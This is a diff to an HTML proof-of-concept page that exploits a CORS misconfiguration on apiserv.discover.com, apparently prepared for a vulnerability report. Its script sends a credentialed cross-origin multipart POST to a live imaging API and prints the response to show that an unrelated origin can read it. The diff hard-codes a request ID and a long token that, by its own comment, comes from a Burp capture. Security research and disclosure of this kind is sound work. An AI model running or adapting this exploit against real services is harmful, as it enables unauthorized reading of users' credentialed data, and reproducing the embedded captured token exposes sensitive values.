@@ -1,35 +1,55 @@
 <!DOCTYPE html>
 <html>
+<head><meta charset="utf-8"><title>CORS PoC</title></head>
 <body>
-<h3>CORS PoC — Discover apiserv.discover.com</h3>
+<h3>CORS PoC — apiserv.discover.com</h3>
 <p>Page origin: <span id="origin"></span></p>
-<pre id="output">Running...</pre>
+<pre id="output" style="white-space: pre-wrap; word-break: break-all;">Running...</pre>
 <script>
 document.getElementById('origin').textContent = window.location.origin;
 
 async function run() {
-  const formData = new FormData();
-  formData.append('requestId', 'req-poc-test-' + Date.now());
-  formData.append('InputVariables', JSON.stringify([
-    {"Id":"PVARMOBJFOLDER","Value":"test"},
-    {"Id":"PVARPROCESSNAME","Value":"COP"}
-  ]));
-  const blob = new Blob(['%PDF-1.7 test'], {type: 'application/pdf'});
-  formData.append('file', blob, 'poc.pdf');
+  const boundary = '----WebKitFormBoundaryPoC' + Date.now();
+
+  // NOTE: Replace REQUEST_ID and MOBJFOLDER_TOKEN below with values from
+  // your most recent Burp capture that returned the "Invalid Captcha" response
+  // WITH Access-Control-Allow-Origin present. Older tokens likely expired,
+  // but this is worth one try before falling back to Burp-only evidence.
+  const requestId = 'req-65265e37-fd87-4f89-ab43-1330427ae475';
+  const mobjFolderToken = '0cAFcWeA54t6WKexi4GsiI8WZ9MYVXe1mYiRoMPzKUSMhIrDX9OV-S_vxZ6t3ETzj7luh8jMGwULoqc_pl9us0TMW0YTkA6BYfOrrLUwJuw612QmISPbW07027rzP1-EQoAluNFddfGl_ze-Apu1iNFfT9S2JG2RcmlHbcRU7uyhva8PSA6841bdNXWV_e4KhzcX2XTnkMsfQNNyZ7Vp5VkBvXEHtJel3QUiVNZ2qQ20c6Fc3vqTshTOERRLoOi9IsO3snUcS-2yUzBSjbpJTIuShTQGG3wUjFXjlF7ahafjQLGpYTnhEEq8NrYxc-PRCuq4l7h6tKGbciiqa94fzrFUqfBz2kAdGpFNO8JSex8Q37zB7QNDiV7SaruZ7oaE4L4p2UCgYyG-L4nXtyfAMtI5qh3GsvQxk0NpAb8DNDfnZvMJJHtv7pjr4-8S1kDIUwI3Y4_GY2gJrDmM9t-zAXt2DJ9SeBXpAxQpILVt2m5X47_PulmPIy6Y7ygOnUicde64JqzEV5ovtkGXudKZPGx8S8njCF7GTn_TaetMzvbbPeU6GuMfRl9clbcQbPq3DTh0UfPEyOS5nNwHiU1guHjpdWBA7mAx-jVQTe0aEpWX7OQUFtJe4kbDTysDRdsQQt-Fpx0iZQcCgi3JioKgshsrsqKfmbtWoElbbSIgL1yIuJQYPsVd7h7vL1oispzyc2IlYbrtslG0xpZ3TZiHXKLkYEvzxDNGqZzhJXBTI6FOZ7yZLQQNFKFB2oJzL1_X4d0CNNeMCcPKJs1uYf9PHPmq3EVBpMT8CCYqoRNTuIR2yOZu19dOcv74Grlm6RdjI6odUcO3PO6gMrqkcjOhAMRhlHqWcfyEK3FCCcwPLYlnLD1UEayv_aqfQp3YYrpgp9YMP_pLw6M7IxJfelaC4A3SGVz6UBKa4w2_f-9Jzi-vVl6wvHWvBOQRdAhR9BHJX5bJBMfC4S5SiO2H_Zx3OWLinXHlIoV7fm5EYj0PURu2huwG4VP2zArOGh5uQMVjhmfJdAsyX9Ncwm3odFvnHtufccLv4zsBiy-rLMYHTcPGrsIL40rY6VOiYayeFwoV3WIZcg925h7ypf5zio_4ZZRcGdiCNN1RfHwCnCuVW0ZwO3NHL43i2BUfTeGHH_VH0vIdz5Im4pBrboXT7D2BxhkDIrK3W9BVsf-x0W3rWDd09A51ZyNgs7eFycXC4Hg8C1G684imOheHw0H5hnQqct6DkkijiXLcY5tpZRDtrVza9I6-lZnoEYcc9LKhg0G0XIf2gr7erV0p9FFF2lWaccmqPr4BS4GB40U_Ii5SHMO15HIl91uiNCJWwQHrbQCAgFEtlpNlk3J5ufqh2kyRxeCI0IKgcgUciiBsNxvcYjAPo5KDPmbfUlP5adz-kgsDQUoCXekD93BrhJK1cMk4eFrX1yIj8RBI5VNCG2Vq2DduY9Kzu0Qdht0i1-AVHpf57q9AY3IRlK85-JmkjKo5DcPGRdnduhCZCH0t7BhN422A2yRr1UqTZf1es5MzRGDzx9FU3EZBv6fYJ86J1n3FatJ3rk6iDFquoRZvN_DU7bGT54zvcEFP5NV5T_4b2T1J2d0TPy_ZtYdi02e855x2gqMfOiLPu_BMrkikAlUN72U5jGrvnNY2wP8i6qEPjDo5-E_FW3qE0lARgzvUMaaiKDV77Jz-xcQSifOHe0E8as8zQ4h-DvhYWP0yauO93AObEcoF8HEX5yfoKmgxttveFl47elJj5OgD-hfBBs_1BJVZKF3dbg3Rf-7Bzk1YRxS2-hktcO0IYawWO8OGqMUCofCtIMsPbqzavjoNALkz3jMKFvH49_Ajd2igPnISI8zfmCfb9Lv3UxVdWPEDWKrTsaM3VRD3ZrcWfhXC1mW2SCFBaqFExSGt_ltzVeaMdseSkvM7MSskwqFt9b9mhe-jldABFWPsTq6tBP05ME62HXBFC3uH5s8BSDQ20VbBV2t2jPRb-Ssv5-jgZ84b9rGmZnJHppej90SDfcQemhKTGC9sIRbhCGPLeRJt3gvmO1hRKudVO4z64ettOF-zBZQAs2mDrRPGDNo8NlROZF5dA-uvqKg0_ufld5-XYyVN9WxaseUSTW4hlVmXR3Rr26kdvkQcM7dwK0CF336LC5IVl4fngHoW2awmSgeMflAg0ejGzobhk8VuIliNorUyIh940JCwGszU5IJFsqND9PTFZywoM75TWUzVPr6j9rGTEOzHV2_e_2o9rtJQOn2KqsW1J_jw-26--pcAPd27W0-Rqky--eGcj5vWx1SiYVbEMfSHYy_F5qv2e9YD5MaXSZ6Bg7_-Rgo5VHm4fkaLrHJH47aJJixAs7Pmf7_tg';
+
+  const body =
+    `--${boundary}\r\n` +
+    `Content-Disposition: form-data; name="requestId"\r\n\r\n` +
+    `${requestId}\r\n` +
+    `--${boundary}\r\n` +
+    `Content-Disposition: form-data; name="InputVariables"\r\n\r\n` +
+    `[{"Id":"PVARMOBJFOLDER","Value":"${mobjFolderToken}"},{"Id":"PVARPROCESSNAME","Value":"COP"}]\r\n` +
+    `--${boundary}\r\n` +
+    `Content-Disposition: form-data; name="file"; filename="final.pdf"\r\n` +
+    `Content-Type: application/pdf\r\n\r\n` +
+    `%PDF-1.7 test content\r\n` +
+    `--${boundary}--\r\n`;
 
   try {
     const res = await fetch('https://apiserv.discover.com/enterprise/imaging/connectivity/v1/connectivityRequest', {
       method: 'POST',
       credentials: 'include',
-      body: formData
+      headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` },
+      body: body
     });
     const text = await res.text();
     document.getElementById('output').textContent =
-      'Status: ' + res.status + '\nBody: ' + text +
-      '\n\n^ This response was read by JavaScript running on ' + window.location.origin +
-      ', a completely unrelated origin, because the server reflects arbitrary Origin headers with credentials enabled.';
+      'Status: ' + res.status + '\n' +
+      'Body: ' + text + '\n\n' +
+      '^ If you can read this text, it means JavaScript running on ' + window.location.origin +
+      ' (an origin unrelated to Discover) successfully read a credentialed cross-origin response ' +
+      'from apiserv.discover.com, confirming the CORS misconfiguration is exploitable in a live browser.';
   } catch (e) {
-    document.getElementById('output').textContent = 'Fetch blocked: ' + e.message;
+    document.getElementById('output').textContent =
+      'Fetch blocked by browser: ' + e.message +
+      '\n\nThis means the specific response path hit here did not include CORS headers ' +
+      '(see Burp captures for the response paths that do).';
   }
 }
 run();
